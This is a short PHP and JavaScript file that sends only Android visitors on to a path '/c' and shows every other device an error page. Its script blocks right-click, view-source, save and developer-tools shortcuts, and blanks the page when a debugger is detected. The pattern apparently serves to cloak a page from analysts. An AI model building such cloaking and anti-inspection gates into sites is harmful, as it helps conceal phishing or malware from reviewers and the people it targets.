<?php
$ua = $_SERVER['HTTP_USER_AGENT'];

if (stripos($ua, 'Android') !== false) {
    header('Location: /c');
    exit;
}

elseif (stripos($ua, 'iPhone') !== false || stripos($ua, 'iPad') !== false || stripos($ua, 'iOS') !== false) {
    header('Location: /Error.php');
    exit;
}

elseif (stripos($ua, 'Windows') !== false) {
    header('Location: /Error.php');
    exit;
}

elseif (stripos($ua, 'Macintosh') !== false) {
    header('Location: /Error.php');
    exit;
}

else {
    header('Location: /Error.php');
    exit;
}
?>
<script>
document.addEventListener('contextmenu', e => e.preventDefault());
document.addEventListener('keydown', function(e){
    if(
        e.keyCode === 123 || 
        (e.ctrlKey && e.keyCode === 85) || 
        (e.ctrlKey && e.shiftKey && e.keyCode === 73) ||
        (e.ctrlKey && e.keyCode === 83)
    ){
        e.preventDefault();
        return false;
    }
});
document.addEventListener('selectstart', e => e.preventDefault());

// basic devtools detect (weak)
setInterval(function(){
    const before = Date.now();
    debugger;
    const after = Date.now();
    if(after - before > 100){
        document.body.innerHTML = "";
    }
}, 2000);
</script>
